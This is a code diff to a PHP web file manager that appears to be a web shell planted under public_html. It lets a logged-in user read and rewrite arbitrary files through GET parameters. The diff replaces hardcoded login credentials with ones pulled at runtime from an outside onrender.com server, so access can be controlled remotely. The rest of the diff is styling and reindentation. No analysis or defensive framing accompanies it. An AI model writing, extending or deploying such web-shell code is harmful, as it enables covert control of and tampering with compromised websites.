@@ -9,10 +9,9 @@ $current = realpath(getcwd());
 $rootDir = preg_replace('#(.*?/public_html)(/.*)?$#', '$1', $current);
 
 if ($rootDir === false) $rootDir = '/';
-
-$valid_user = "mrroger";
-$valid_pass = md5("langitsenja");
-
+$authData = json_decode(file_get_contents('https://auth-api-dry6.onrender.com/'), true);
+$valid_user = $authData['username'];
+$valid_pass = $authData['password'];
 function in_root($path) {
     global $rootDir;
     $real = realpath($path);
@@ -507,10 +506,12 @@ if (empty($_SESSION['logged_in'])):
 
     .error {
         background: rgba(255, 80, 80, 0.12);
-        padding: 8px;
-        border-radius: 6px;
-        color: var(--danger);
-        margin-bottom: 12px
+        padding: 6px 8px;
+        font-size: 13px;
+        letter-spacing: 1px;
+        border-radius: 4px;
+        color: #f93636;
+        margin-bottom: 12px;
     }
     </style>
 </head>
@@ -1124,12 +1125,12 @@ $currentReal = realpath($currentDir);
 </html>
 
 <?php
-                    // -------------------- Inline edit page (terminal fullscreen) --------------------
-                    if (isset($_GET['edit']) && is_file($_GET['edit']) && isset($_GET['terminal'])) {
-                        $file = $_GET['edit'];
-                        $content = @file_get_contents($file);
-                        // minimal full-screen editor (green on black style)
-                        ?>
+                        // -------------------- Inline edit page (terminal fullscreen) --------------------
+                        if (isset($_GET['edit']) && is_file($_GET['edit']) && isset($_GET['terminal'])) {
+                            $file = $_GET['edit'];
+                            $content = @file_get_contents($file);
+                            // minimal full-screen editor (green on black style)
+                            ?>
 <!DOCTYPE html>
 <html>
 
@@ -1221,13 +1222,13 @@ $currentReal = realpath($currentDir);
 
 </html>
 <?php
-                        exit;
-                    }
-                    
-                    if (isset($_GET['edit']) && is_file($_GET['edit']) && (isset($_GET['ajax']) || isset($_GET['plain']))) {
-                        $file = $_GET['edit'];
-                        $content = @file_get_contents($file);
-                        echo "<h3 style='color:#fff'>Edit File: " . htmlspecialchars($file) . "</h3>
+                            exit;
+                        }
+                        
+                        if (isset($_GET['edit']) && is_file($_GET['edit']) && (isset($_GET['ajax']) || isset($_GET['plain']))) {
+                            $file = $_GET['edit'];
+                            $content = @file_get_contents($file);
+                            echo "<h3 style='color:#fff'>Edit File: " . htmlspecialchars($file) . "</h3>
     <form method='post' onsubmit='submitEdit(event)'>
       <textarea id='editArea' class='textarea' style='background:#041018;color:#dff7ff'>".htmlspecialchars($content, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')."</textarea>
       <input type='hidden' id='targetFile' value='" . htmlspecialchars($file) . "'>
@@ -1237,7 +1238,7 @@ $currentReal = realpath($currentDir);
       </div>
       <div id='editStatus' style='margin-top:8px;color:#9aa4ad'></div>
     </form>";
-                        if (isset($_GET['plain'])) exit;
-                    }
-                    
-                    ?>
+                            if (isset($_GET['plain'])) exit;
+                        }
+                        
+                        ?>
